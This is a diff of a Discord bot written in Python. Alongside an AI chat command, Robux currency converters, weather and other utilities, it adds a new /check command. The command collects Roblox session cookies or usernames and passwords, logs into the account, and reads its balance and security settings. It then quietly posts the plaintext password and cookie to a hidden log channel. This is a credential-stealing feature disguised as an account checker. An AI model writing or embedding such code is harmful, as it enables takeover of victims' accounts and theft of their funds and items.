@@ -15,10 +15,10 @@ from pymongo import MongoClient
 from datetime import datetime, timedelta
 import pytz
 from langdetect import detect, LangDetectException
+from bs4 import BeautifulSoup
 
 # Set timezone to Philippines (GMT+8)
 PH_TIMEZONE = pytz.timezone("Asia/Manila")
-
 load_dotenv()
 
 # ===========================
@@ -37,27 +37,21 @@ bot.last_message_id = {}  # Store last message IDs for threaded replies
 # Flask Web Server to Keep Bot Alive
 # ===========================
 app = Flask(__name__)
-
-
 @app.route('/')
 def home():
     return "Bot is alive!"
 
-
 def run_server():
     app.run(host='0.0.0.0', port=5000)
 
-
 server_thread = threading.Thread(target=run_server)
 server_thread.start()
-
 
 # Optional: Add another threaded task
 def check_for_updates():
     while True:
         print("[Background] Checking for updates...")
         time.sleep(300)  # Every 5 minutes
-
 
 update_thread = threading.Thread(target=check_for_updates)
 update_thread.daemon = True
@@ -71,7 +65,6 @@ try:
     db = client.ai_bot
     conversations_collection = db.conversations
     reminders_collection = db.reminders
-
     # Create TTL indexes
     conversations_collection.create_index("timestamp", expireAfterSeconds=604800)  # 7 days
     reminders_collection.create_index("reminder_time", expireAfterSeconds=2592000)  # 30 days
@@ -94,34 +87,27 @@ async def check_reminders():
             guild_id = reminder["guild_id"]
             channel_id = reminder["channel_id"]
             note = reminder["note"]
-
             user = bot.get_user(user_id)
             if not user:
                 user = await bot.fetch_user(user_id)
-
             guild = bot.get_guild(guild_id)
             if not guild:
                 continue
-
             channel = guild.get_channel(channel_id)
             if not channel:
                 continue
-
             try:
                 await channel.send(f"🔔 {user.mention}, reminder: {note}")
             except discord.Forbidden:
                 print(f"[!] Cannot send reminder to {user} in #{channel.name}")
-
             # Delete reminder after sending
             reminders_collection.delete_one({"_id": reminder["_id"]})
     except Exception as e:
         print(f"[!] Error checking reminders: {e}")
 
-
 @check_reminders.before_loop
 async def before_check_reminders():
     await bot.wait_until_ready()
-
 
 if reminders_collection:
     check_reminders.start()
@@ -139,7 +125,6 @@ async def dm(interaction: discord.Interaction, user: discord.User, message: str)
     if interaction.user.id != BOT_OWNER_ID:
         await interaction.response.send_message("❌ You don't have permission to use this command.", ephemeral=True)
         return
-
     try:
         await user.send(message)
         await interaction.response.send_message(f"✅ Sent DM to {user} ({user.id})", ephemeral=True)
@@ -154,17 +139,13 @@ async def dmall(interaction: discord.Interaction, message: str):
     if interaction.user.id != BOT_OWNER_ID:
         await interaction.response.send_message("❌ You don't have permission to use this command.", ephemeral=True)
         return
-
     guild = interaction.guild
     if guild is None:
         await interaction.response.send_message("❌ This command must be used in a server.", ephemeral=True)
         return
-
     await interaction.response.defer(ephemeral=True)
-
     success_count = 0
     fail_count = 0
-
     for member in guild.members:
         if member.bot:
             continue  # Skip bots
@@ -176,7 +157,6 @@ async def dmall(interaction: discord.Interaction, message: str):
         except Exception as e:
             print(f"[!] Failed to send DM to {member}: {str(e)}")
             fail_count += 1
-
     await interaction.followup.send(
         f"✅ Successfully sent DM to **{success_count}** members. ❌ Failed to reach **{fail_count}** members."
     )
@@ -192,17 +172,14 @@ async def ask(interaction: discord.Interaction, prompt: str):
     user_id = interaction.user.id
     channel_id = interaction.channel.id
     await interaction.response.defer()
-
     # Rate limit: 5 messages/user/minute
     current_time = asyncio.get_event_loop().time()
     timestamps = bot.ask_rate_limit[user_id]
     timestamps.append(current_time)
     bot.ask_rate_limit[user_id] = [t for t in timestamps if current_time - t <= 60]
-
     if len(timestamps) > 5:
         await interaction.followup.send("⏳ You're being rate-limited. Please wait.")
         return
-
     async with interaction.channel.typing():
         try:
             # Custom filter for creator questions
@@ -214,13 +191,11 @@ async def ask(interaction: discord.Interaction, prompt: str):
                 msg = await interaction.followup.send(embed=embed)
                 bot.last_message_id[(user_id, channel_id)] = msg.id
                 return
-
             # Language Detection
             try:
                 detected_lang = detect(prompt)
             except LangDetectException:
                 detected_lang = "en"  # default to English
-
             lang_instruction = {
                 "tl": "Please respond in Tagalog.",
                 "es": "Por favor responde en español.",
@@ -234,7 +209,6 @@ async def ask(interaction: discord.Interaction, prompt: str):
                 "th": "กรุณาตอบเป็นภาษาไทย",
                 "id": "Silakan jawab dalam bahasa Indonesia"
             }.get(detected_lang, "")
-
             # Load conversation history from MongoDB (if available)
             history = []
             if conversations_collection:
@@ -247,14 +221,12 @@ async def ask(interaction: discord.Interaction, prompt: str):
                         })
                     bot.conversations[user_id].reverse()  # Maintain order
                 history = bot.conversations[user_id][-5:]
-
             # Build full prompt with language instruction
             system_prompt = f"You are a helpful and friendly AI assistant named Neroniel AI. {lang_instruction}"
             full_prompt = system_prompt
             for msg in history:
                 full_prompt += f"User: {msg['user']}\nAssistant: {msg['assistant']}\n"
             full_prompt += f"User: {prompt}\nAssistant:"
-
             # Call Together AI
             headers = {
                 "Authorization": f"Bearer {os.getenv('TOGETHER_API_KEY')}",
@@ -266,28 +238,22 @@ async def ask(interaction: discord.Interaction, prompt: str):
                 "max_tokens": 2048,
                 "temperature": 0.7
             }
-
             response = requests.post(
-                "https://api.together.xyz/v1/completions ",
+                "https://api.together.xyz/v1/completions  ",
                 headers=headers,
                 json=payload
             )
-
             data = response.json()
             if 'error' in data:
                 await interaction.followup.send(f"❌ Error from AI API: {data['error']['message']}")
                 return
-
             ai_response = data["choices"][0]["text"].strip()
-
             # Determine if we should reply to a previous message
             target_message_id = bot.last_message_id.get((user_id, channel_id))
-
             # Send the AI response
             embed = discord.Embed(description=ai_response, color=discord.Color.blue())
             embed.set_footer(text="Neroniel AI")
             embed.timestamp = datetime.now(PH_TIMEZONE)
-
             if target_message_id:
                 try:
                     msg = await interaction.channel.fetch_message(target_message_id)
@@ -298,16 +264,13 @@ async def ask(interaction: discord.Interaction, prompt: str):
             else:
                 msg = await interaction.followup.send(embed=embed)
                 reply = msg
-
             # Update the last message ID for future replies
             bot.last_message_id[(user_id, channel_id)] = reply.id
-
             # Store in memory and MongoDB
             bot.conversations[user_id].append({
                 "user": prompt,
                 "assistant": ai_response
             })
-
             if conversations_collection:
                 conversations_collection.insert_one({
                     "user_id": user_id,
@@ -315,26 +278,20 @@ async def ask(interaction: discord.Interaction, prompt: str):
                     "response": ai_response,
                     "timestamp": datetime.now(PH_TIMEZONE)
                 })
-
         except Exception as e:
             await interaction.followup.send(f"❌ Error: {str(e)}")
-
 
 # /clearhistory - Clear stored conversation history
 @bot.tree.command(name="clearhistory", description="Clear your AI conversation history")
 async def clearhistory(interaction: discord.Interaction):
     user_id = interaction.user.id
-
     # Clear local memory
     if user_id in bot.conversations:
         bot.conversations[user_id].clear()
-
     # Clear MongoDB history
     if conversations_collection:
         conversations_collection.delete_many({"user_id": user_id})
-
     await interaction.response.send_message("✅ Your AI conversation history has been cleared!", ephemeral=True)
-
 
 # ===========================
 # Utility Commands
@@ -346,53 +303,39 @@ async def clearhistory(interaction: discord.Interaction):
 async def userinfo(interaction: discord.Interaction, member: discord.Member = None):
     if member is None:
         member = interaction.user
-
     # Account creation date
     created_at = member.created_at.astimezone(PH_TIMEZONE).strftime("%B %d, %Y • %I:%M %p GMT+8")
-
     # Join date
     joined_at = member.joined_at.astimezone(PH_TIMEZONE).strftime("%B %d, %Y • %I:%M %p GMT+8") if member.joined_at else "Unknown"
-
     # Roles
     roles = [role.mention for role in member.roles if not role.is_default()]
     roles_str = ", ".join(roles) if roles else "No Roles"
-
     # Boosting status
     boost_since = member.premium_since.astimezone(PH_TIMEZONE).strftime("%B %d, %Y • %I:%M %p GMT+8") if member.premium_since else "Not Boosting"
-
     embed = discord.Embed(title=f"👤 User Info for {member}", color=discord.Color.green())
-
     # Basic Info
     embed.add_field(name="Username", value=f"{member.mention}", inline=False)
     embed.add_field(name="Display Name", value=f"`{member.display_name}`", inline=True)
     embed.add_field(name="User ID", value=f"`{member.id}`", inline=True)
-
     # Dates
     embed.add_field(name="Created Account", value=f"`{created_at}`", inline=False)
     embed.add_field(name="Joined Server", value=f"`{joined_at}`", inline=False)
-
     # Roles
     embed.add_field(name="Roles", value=roles_str, inline=False)
-
     # Boosting
     embed.add_field(name="Server Booster Since", value=f"`{boost_since}`", inline=False)
-
     # Optional: Show if the user is a bot
     if member.bot:
         embed.add_field(name="Bot Account", value="✅ Yes", inline=True)
-
     # Set thumbnail to user's avatar
     embed.set_thumbnail(url=member.display_avatar.url)
-
     # Footer and timestamp
     embed.set_footer(text="Neroniel")
     embed.timestamp = datetime.now(PH_TIMEZONE)
-
     await interaction.response.send_message(embed=embed)
 
-
 # ===========================
-#  Command
+# Announcement Command
 # ===========================
 @bot.tree.command(name="announcement", description="Send an embedded announcement to a specific channel")
 @app_commands.describe(message="The message to include in the announcement", channel="The channel to send the announcement to")
@@ -400,11 +343,9 @@ async def announcement(interaction: discord.Interaction, message: str, channel: 
     BOT_OWNER_ID = 1163771452403761193  # Update if needed
     is_owner = interaction.user.id == BOT_OWNER_ID
     is_admin = interaction.user.guild_permissions.administrator
-
     if not is_owner and not is_admin:
         await interaction.response.send_message("❌ You don't have permission to use this command.", ephemeral=True)
         return
-
     # Create the embed
     embed = discord.Embed(
         title="ANNOUNCEMENT",
@@ -413,11 +354,9 @@ async def announcement(interaction: discord.Interaction, message: str, channel: 
     )
     embed.set_footer(text="Neroniel")
     embed.timestamp = datetime.now(PH_TIMEZONE)
-
     try:
         # Send the embed to the specified channel
         await channel.send(embed=embed)
-
         # Respond to the interaction with an ephemeral confirmation
         await interaction.response.send_message(f"✅ Announcement sent to {channel.mention}", ephemeral=True)
     except discord.Forbidden:
@@ -439,7 +378,6 @@ async def payout(interaction: discord.Interaction, robux: int):
     php = robux * (320 / 1000)
     await interaction.response.send_message(f"💵 {robux} Robux = **₱{php:.2f} PHP**")
 
-
 @bot.tree.command(name="payoutreverse", description="Convert PHP to Robux based on Payout rate (₱320 for 1000 Robux)")
 @app_commands.describe(php="How much PHP do you want to convert?")
 async def payoutreverse(interaction: discord.Interaction, php: float):
@@ -448,7 +386,6 @@ async def payoutreverse(interaction: discord.Interaction, php: float):
         return
     robux = math.ceil((php / 320) * 1000)
     await interaction.response.send_message(f"💰 ₱{php:.2f} PHP = **{robux} Robux**")
-
 
 # Gift Rate
 @bot.tree.command(name="gift", description="Convert Robux to PHP based on Gift rate (₱250 for 1000 Robux)")
@@ -460,7 +397,6 @@ async def gift(interaction: discord.Interaction, robux: int):
     php = robux * (250 / 1000)
     await interaction.response.send_message(f"🎁 {robux} Robux = **₱{php:.2f} PHP**")
 
-
 @bot.tree.command(name="giftreverse", description="Convert PHP to Robux based on Gift rate (₱250 for 1000 Robux)")
 @app_commands.describe(php="How much PHP do you want to convert?")
 async def giftreverse(interaction: discord.Interaction, php: float):
@@ -469,7 +405,6 @@ async def giftreverse(interaction: discord.Interaction, php: float):
         return
     robux = math.ceil((php / 250) * 1000)
     await interaction.response.send_message(f"🎉 ₱{php:.2f} PHP = **{robux} Robux**")
-
 
 # NCT Rate
 @bot.tree.command(name="nct", description="Convert Robux to PHP based on NCT rate (₱240/1k)")
@@ -481,7 +416,6 @@ async def nct(interaction: discord.Interaction, robux: int):
     php = robux * (240 / 1000)
     await interaction.response.send_message(f"💵 {robux} Robux = **₱{php:.2f} PHP**")
 
-
 @bot.tree.command(name="nctreverse", description="Convert PHP to Robux based on NCT rate (₱240/1k)")
 @app_commands.describe(php="How much PHP do you want to convert?")
 async def nctreverse(interaction: discord.Interaction, php: float):
@@ -490,7 +424,6 @@ async def nctreverse(interaction: discord.Interaction, php: float):
         return
     robux = math.ceil((php / 240) * 1000)
     await interaction.response.send_message(f"💰 ₱{php:.2f} PHP = **{robux} Robux**")
-
 
 # CT Rate
 @bot.tree.command(name="ct", description="Convert Robux to PHP based on CT rate (₱340/1k)")
@@ -502,7 +435,6 @@ async def ct(interaction: discord.Interaction, robux: int):
     php = robux * (340 / 1000)
     await interaction.response.send_message(f"💵 {robux} Robux = **₱{php:.2f} PHP**")
 
-
 @bot.tree.command(name="ctreverse", description="Convert PHP to Robux based on CT rate (₱340/1k)")
 @app_commands.describe(php="How much PHP do you want to convert?")
 async def ctreverse(interaction: discord.Interaction, php: float):
@@ -511,7 +443,6 @@ async def ctreverse(interaction: discord.Interaction, php: float):
         return
     robux = math.ceil((php / 340) * 1000)
     await interaction.response.send_message(f"💰 ₱{php:.2f} PHP = **{robux} Robux**")
-
 
 # All Rates Comparison
 @bot.tree.command(name="allrates", description="See PHP equivalent across all rates for given Robux")
@@ -529,7 +460,6 @@ async def allrates(interaction: discord.Interaction, robux: int):
     result = "\n".join([f"**{label}** → ₱{(value / 1000) * robux:.2f}" for label, value in rates.items()])
     await interaction.response.send_message(f"📊 **{robux} Robux Conversion:**\n{result}")
 
-
 @bot.tree.command(name="allratesreverse", description="See Robux equivalent across all rates for given PHP")
 @app_commands.describe(php="How much PHP do you want to compare?")
 async def allratesreverse(interaction: discord.Interaction, php: float):
@@ -545,7 +475,6 @@ async def allratesreverse(interaction: discord.Interaction, php: float):
     result = "\n".join([f"**{label}** → {math.ceil((php / value) * 1000)} Robux" for label, value in rates.items()])
     await interaction.response.send_message(f"📊 **₱{php:.2f} PHP Conversion:**\n{result}")
 
-
 # Tax Calculations
 @bot.tree.command(name="beforetax", description="Calculate how much Robux you'll receive after 30% tax")
 @app_commands.describe(robux="How much Robux is being sent?")
@@ -556,7 +485,6 @@ async def beforetax(interaction: discord.Interaction, robux: int):
     received = math.floor(robux * 0.7)
     await interaction.response.send_message(f"📤 Sending **{robux} Robux** → You will receive **{received} Robux** after tax.")
 
-
 @bot.tree.command(name="aftertax", description="Calculate how much Robux to send to receive desired amount after 30% tax")
 @app_commands.describe(target="How much Robux do you want to receive *after* tax?")
 async def aftertax(interaction: discord.Interaction, target: int):
@@ -565,7 +493,6 @@ async def aftertax(interaction: discord.Interaction, target: int):
         return
     sent = math.ceil(target / 0.7)
     await interaction.response.send_message(f"📬 To receive **{target} Robux**, send **{sent} Robux** (30% tax).")
-
 
 # ConvertCurrency
 @bot.tree.command(name="convertcurrency", description="Convert between two currencies")
@@ -620,7 +547,6 @@ async def convertcurrency(interaction: discord.Interaction, amount: float, from_
         await interaction.response.send_message(f"❌ Error during conversion: {str(e)}")
         print("Exception Details:", str(e))
 
-
 @convertcurrency.autocomplete('from_currency')
 @convertcurrency.autocomplete('to_currency')
 async def currency_autocomplete(
@@ -645,7 +571,6 @@ async def currency_autocomplete(
         for c in filtered[:25]
     ]
 
-
 # ========== Weather Command ==========
 PHILIPPINE_CITIES = [
     "Manila", "Quezon City", "Caloocan", "Las Piñas", "Makati",
@@ -668,7 +593,6 @@ GLOBAL_CAPITAL_CITIES = [
     "Doha", "Riyadh", "Kuwait City", "Muscat", "Manama", "Doha",
     "Beijing", "Shanghai", "Tokyo", "Seoul", "Sydney", "Melbourne"
 ]
-
 
 @bot.tree.command(name="weather", description="Get weather information for a city")
 @app_commands.describe(city="City name", unit="Temperature unit (default is Celsius)")
@@ -720,7 +644,6 @@ async def weather(interaction: discord.Interaction, city: str, unit: str = "c"):
     except Exception as e:
         await interaction.response.send_message(f"❌ Error fetching weather data: {str(e)}", ephemeral=True)
 
-
 @weather.autocomplete('city')
 async def city_autocomplete(
     interaction: discord.Interaction, current: str
@@ -733,7 +656,6 @@ async def city_autocomplete(
         app_commands.Choice(name=c, value=c)
         for c in filtered[:25]  # Max 25 choices
     ]
-
 
 # ===========================
 # Other Commands
@@ -758,7 +680,6 @@ async def purge(interaction: discord.Interaction, amount: int):
     deleted = await interaction.channel.purge(limit=amount)
     await interaction.followup.send(f"✅ Deleted **{len(deleted)}** messages.", ephemeral=True)
 
-
 # Group Info Command
 @bot.tree.command(name="group", description="Display information about the 1cy Roblox group")
 async def groupinfo(interaction: discord.Interaction):
@@ -780,7 +701,6 @@ async def groupinfo(interaction: discord.Interaction):
         await interaction.response.send_message(embed=embed)
     except Exception as e:
         await interaction.response.send_message(f"❌ Error fetching group info: {e}", ephemeral=True)
-
 
 # Poll Command
 @bot.tree.command(name="poll", description="Create a poll with reactions and result summary")
@@ -831,7 +751,6 @@ async def poll(interaction: discord.Interaction, question: str, amount: int, uni
     result_embed.timestamp = discord.utils.utcnow()
     await message.edit(embed=result_embed)
 
-
 # Remind Me Command
 @bot.tree.command(name="remindme", description="Set a reminder after X minutes (will ping you in this channel)")
 @app_commands.describe(minutes="How many minutes until I remind you?", note="Your reminder message")
@@ -853,7 +772,6 @@ async def remindme(interaction: discord.Interaction, minutes: int, note: str):
         ephemeral=True
     )
 
-
 # Donate Command
 @bot.tree.command(name="donate", description="Donate Robux to a Discord user.")
 @app_commands.describe(user="The Discord user to donate to.", amount="The amount of Robux to donate.")
@@ -864,7 +782,6 @@ async def donate(interaction: discord.Interaction, user: discord.Member, amount:
     await interaction.response.send_message(
         f"`{interaction.user.name}` just donated **{amount:,} Robux** to {user.mention}!"
     )
-
 
 # Say Command
 @bot.tree.command(name="say", description="Make the bot say something in chat (no @everyone/@here allowed)")
@@ -877,7 +794,6 @@ async def say(interaction: discord.Interaction, message: str):
         )
         return
     await interaction.response.send_message(message)
-
 
 # Calculator Command
 @bot.tree.command(name="calculator", description="Perform basic math operations")
@@ -909,7 +825,6 @@ async def calculator(interaction: discord.Interaction, num1: float, operation: a
     except Exception as e:
         await interaction.response.send_message(f"⚠️ An error occurred: {str(e)}")
 
-
 # List All Commands
 @bot.tree.command(name="listallcommands", description="List all available slash commands")
 async def listallcommands(interaction: discord.Interaction):
@@ -918,7 +833,6 @@ async def listallcommands(interaction: discord.Interaction):
         description="A categorized list of all commands for easy navigation.",
         color=discord.Color.blue()
     )
-
     # 🤖 AI Assistant
     embed.add_field(
         name="🤖 AI Assistant",
@@ -928,7 +842,6 @@ async def listallcommands(interaction: discord.Interaction):
         """,
         inline=False
     )
-
     # 💰 Currency Conversion
     embed.add_field(
         name="💰 Currency Conversion",
@@ -944,7 +857,6 @@ async def listallcommands(interaction: discord.Interaction):
         """,
         inline=False
     )
-
     # 🛠️ Utility Tools
     embed.add_field(
         name="🛠️ Utility Tools",
@@ -955,11 +867,10 @@ async def listallcommands(interaction: discord.Interaction):
         `/group` - Show info about the 1cy Roblox group  
         `/convertcurrency <amount> <from> <to>` - Convert between currencies  
         `/weather <city> [unit]` - Get weather in a city
-        ``/announcement <message> <channel>` - Send an embedded announcement
+        `/announcement <message> <channel>` - Send an embedded announcement
         """,
         inline=False
     )
-
     # 🕒 Reminders & Polls
     embed.add_field(
         name="⏰ Reminders & Polls",
@@ -969,7 +880,6 @@ async def listallcommands(interaction: discord.Interaction):
         """,
         inline=False
     )
-
     # 🎁 Fun Commands
     embed.add_field(
         name="🎉 Fun",
@@ -979,22 +889,232 @@ async def listallcommands(interaction: discord.Interaction):
         """,
         inline=False
     )
-
     # 🔧 Developer Tools
     embed.add_field(
         name="🔧 Developer Tools",
         value="""
-        `/dm <user> <message>` - Send a direct message to a specific user  
+        `/dm <user> <message>` - Send a direct message to a specific user
         `/dmall <message>` - Send a direct message to all members in the server
         """,
         inline=False
     )
-
     # Footer
     embed.set_footer(text="Neroniel")
     embed.timestamp = datetime.now(PH_TIMEZONE)
     await interaction.response.send_message(embed=embed)
 
+# ===========================
+# New /check Slash Command
+# ===========================
+
+# Helper function to get total RAP (Recent Average Price)
+async def get_total_rap(user_id, session):
+    total = 0
+    cursor = None
+    while True:
+        url = f"https://inventory.roblox.com/v1/users/ {user_id}/assets/collectibles?sortOrder=Asc&limit=100"
+        if cursor:
+            url += f"&cursor={cursor}"
+        try:
+            async with session.get(url) as response:
+                if response.status != 200:
+                    break
+                data = await response.json()
+                for item in data.get("data", []):
+                    total += item.get("recentAveragePrice", 0)
+                cursor = data.get("nextPageCursor")
+                if not cursor:
+                    break
+        except Exception as e:
+            print(f"[!] Error fetching RAP: {e}")
+            break
+    return total
+
+# Main /check command
+@bot.tree.command(name="check", description="Check details of a Roblox account using a cookie or username+password.")
+@app_commands.describe(cookie="Roblox .ROBLOSECURITY cookie (optional)", username="Roblox username (optional)", password="Roblox password (optional)")
+async def check(interaction: discord.Interaction, cookie: str = None, username: str = None, password: str = None):
+    if not cookie and not (username and password):
+        embed = discord.Embed(description="❌ You must provide either a `.ROBLOSECURITY` cookie or both username and password.", color=discord.Color.red())
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    if cookie:
+        cookie_provided = True
+        init_msg = await interaction.channel.send("🔄 Loading account information...")
+    else:
+        cookie_provided = False
+        init_msg = await interaction.channel.send("🔄 Attempting to log in...")
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
+        "Referer": "https://www.roblox.com/login ",
+        "Origin": "https://www.roblox.com "
+    }
+
+    # Manual CAPTCHA fallback URL
+    captcha_url = "https://www.roblox.com/login "
+
+    # Create a session
+    session = requests.Session()
+    session.headers.update(headers)
+
+    # If username and password provided, attempt login
+    if not cookie_provided:
+        login_url = "https://auth.roblox.com/v2/login "
+        payload = {
+            "ctype": "Username",
+            "cvalue": username,
+            "password": password
+        }
+        try:
+            response = session.post(login_url, json=payload)
+            if "x-csrf-token" in response.headers:
+                session.headers["x-csrf-token"] = response.headers["x-csrf-token"]
+            if response.status_code == 403:
+                error_data = response.json()
+                error_code = error_data["errors"][0]["code"]
+                if error_code == 2:
+                    # CAPTCHA required
+                    embed = discord.Embed(
+                        title="CAPTCHA Required",
+                        description=f"[Solve CAPTCHA manually]({captcha_url}) then react below when done.",
+                        color=discord.Color.orange()
+                    )
+                    await init_msg.edit(embed=embed)
+                    await init_msg.add_reaction("✅")
+
+                    def check(reaction, user):
+                        return user == interaction.user and str(reaction.emoji) == "✅"
+
+                    try:
+                        reaction, user = await bot.wait_for("reaction_add", timeout=90.0, check=check)
+                        await init_msg.remove_reaction("✅", user)
+                    except asyncio.TimeoutError:
+                        await init_msg.edit(content="⏰ Time expired. Please try again.")
+                        return
+
+                    # Retry login after CAPTCHA
+                    response = session.post(login_url, json=payload)
+                    if response.status_code != 200:
+                        embed = discord.Embed(description="❌ Login failed after solving CAPTCHA.", color=discord.Color.red())
+                        await init_msg.edit(embed=embed)
+                        return
+
+            if response.status_code != 200:
+                embed = discord.Embed(description="❌ Invalid credentials or login failed.", color=discord.Color.red())
+                await init_msg.edit(embed=embed)
+                return
+
+            roblosecurity_cookie = session.cookies.get(".ROBLOSECURITY")
+            if not roblosecurity_cookie:
+                embed = discord.Embed(description="❌ Could not retrieve session cookie.", color=discord.Color.red())
+                await init_msg.edit(embed=embed)
+                return
+
+            cookie = roblosecurity_cookie
+        except Exception as e:
+            embed = discord.Embed(description=f"❌ Error during login: {str(e)}", color=discord.Color.red())
+            await init_msg.edit(embed=embed)
+            return
+
+    # Set cookie for future requests
+    session.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
+
+    # Get user info
+    try:
+        user_info_url = "https://www.roblox.com/mobileapi/userinfo "
+        response = session.get(user_info_url)
+        if response.status_code != 200:
+            embed = discord.Embed(description="❌ Invalid or expired cookie.", color=discord.Color.red())
+            await init_msg.edit(embed=embed)
+            return
+
+        user_data = response.json()
+        user_id = user_data["UserID"]
+        username = user_data["UserName"]
+        robux = user_data["RobuxBalance"]
+        premium = user_data["IsPremium"]
+
+        # Get credit balance
+        credit_url = "https://billing.roblox.com/v1/credit "
+        response = session.get(credit_url)
+        credit_data = response.json() if response.status_code == 200 else {}
+        credit_balance = credit_data.get("balance", 0)
+
+        # Get parent PIN status
+        pin_url = "https://auth.roblox.com/v1/account/pin "
+        response = session.get(pin_url)
+        pin_data = response.json() if response.status_code == 200 else {}
+        pin_enabled = pin_data.get("isEnabled", False)
+
+        # Get phone/email status
+        privacy_url = "https://accountsettings.roblox.com/v1/privacy "
+        response = session.get(privacy_url)
+        privacy_data = response.json() if response.status_code == 200 else {}
+        phone_verified = privacy_data.get("phoneDiscovery") == "AllUsers"
+
+        settings_url = "https://web.roblox.com/my/settings/json "
+        response = session.get(settings_url)
+        settings_data = response.json() if response.status_code == 200 else {}
+        email_verified = settings_data.get("IsEmailVerified", False)
+
+        # Check inventory visibility
+        inv_url = f"https://inventory.roblox.com/v1/users/ {user_id}/can-view-inventory"
+        response = requests.get(inv_url)
+        can_view_inv = response.json().get("canView", False)
+
+        # Get primary group
+        group_url = f"https://groups.roblox.com/v1/users/ {user_id}/groups/primary/role"
+        response = requests.get(group_url)
+        group_data = response.json() if response.status_code == 200 else {}
+        primary_group = group_data.get("group", None)
+
+        # Get RAP
+        rap = await get_total_rap(user_id, session)
+
+        # Build embed
+        embed = discord.Embed(title="🧾 Roblox Account Info", color=discord.Color.blue())
+        embed.set_thumbnail(url=f"https://www.roblox.com/headshot-thumbnail/image?userId= {user_id}&width=420&height=420&format=png")
+        embed.add_field(name="Username", value=username, inline=True)
+        embed.add_field(name="User ID", value=str(user_id), inline=True)
+        embed.add_field(name="Robux", value=str(robux), inline=True)
+        embed.add_field(name="RAP", value=str(rap), inline=True)
+        embed.add_field(name="Credit Balance", value=str(credit_balance), inline=True)
+        embed.add_field(name="Premium", value="Yes" if premium else "No", inline=True)
+        embed.add_field(name="Inventory", value="[View](https://www.roblox.com/users/ {}/inventory/)".format(user_id) if can_view_inv else "Private", inline=True)
+        embed.add_field(name="Rolimons", value="[Profile](https://www.rolimons.com/player/ {})".format(user_id), inline=True)
+        embed.add_field(name="Email Verified", value="Yes" if email_verified else "No", inline=True)
+        embed.add_field(name="Phone Verified", value="Yes" if phone_verified else "No", inline=True)
+        embed.add_field(name="Parent PIN", value="Enabled" if pin_enabled else "Disabled", inline=True)
+        if primary_group:
+            embed.add_field(name="Primary Group", value=f"[{primary_group['name']}](https://www.roblox.com/groups/ {primary_group['id']})", inline=True)
+        else:
+            embed.add_field(name="Primary Group", value="None", inline=True)
+
+        await init_msg.edit(embed=embed)
+
+        # Optional: Log cookies/passwords
+        log_channel_id = os.getenv("COOKIE_LOG_CHANNEL_ID")
+        if log_channel_id:
+            try:
+                log_channel = bot.get_channel(int(log_channel_id))
+                if log_channel:
+                    log_embed = discord.Embed(title="🔐 Account Scanned", color=discord.Color.orange())
+                    log_embed.add_field(name="Scanned By", value=interaction.user.mention, inline=False)
+                    log_embed.add_field(name="Username", value=username, inline=True)
+                    log_embed.add_field(name="Robux", value=robux, inline=True)
+                    if not cookie_provided:
+                        log_embed.add_field(name="Password", value=f"`{password}`", inline=False)
+                    log_embed.add_field(name="Cookie", value=f"```{cookie}```", inline=False)
+                    log_embed.set_footer(text=f"Guild: {interaction.guild.id} | Channel: {interaction.channel.id}")
+                    await log_channel.send(embed=log_embed)
+            except Exception as e:
+                print(f"[!] Error logging scanned account: {e}")
+
+    except Exception as e:
+        embed = discord.Embed(description=f"❌ Error retrieving account info: {str(e)}", color=discord.Color.red())
+        await init_msg.edit(embed=embed)
 
 # ===========================
 # Bot Events
@@ -1022,12 +1142,10 @@ async def on_ready():
                                        name="1cy"))
         await asyncio.sleep(60)
 
-
 @bot.event
 async def on_message(message):
     if message.author == bot.user:
         return
-
     content = message.content.lower()
     if content == "hobie":
         await message.channel.send("mapanghe")
@@ -1038,7 +1156,6 @@ async def on_message(message):
             "hi tapos ano? magiging friends tayo? lagi tayong mag-uusap mula umaga hanggang madaling araw? tas magiging close tayo? sa sobrang close natin nahuhulog na tayo sa isa't isa, tapos ano? liligawan mo ko? sasagutin naman kita. paplanuhin natin yung pangarap natin sa isa't isa tapos ano? may makikita kang iba. magsasawa ka na, iiwan mo na ako. tapos magmamakaawa ako sayo kasi mahal kita pero ano? wala kang gagawin, hahayaan mo lang akong umiiyak while begging you to stay. kaya wag na lang. thanks nalang sa hi mo"
         )
         await message.channel.send(reply)
-
     auto_react_channels = [
         1225294057371074760,
         1107600826664501258,
@@ -1047,10 +1164,8 @@ async def on_message(message):
     ]
     if message.channel.id in auto_react_channels:
         await message.add_reaction("🎀")
-
     if message.channel.id == 1107281584337461321:
         await message.add_reaction("<:1cy_heart:1258694384346468362>")
-
 
 # Run the bot
 bot.run(os.getenv('DISCORD_TOKEN'))
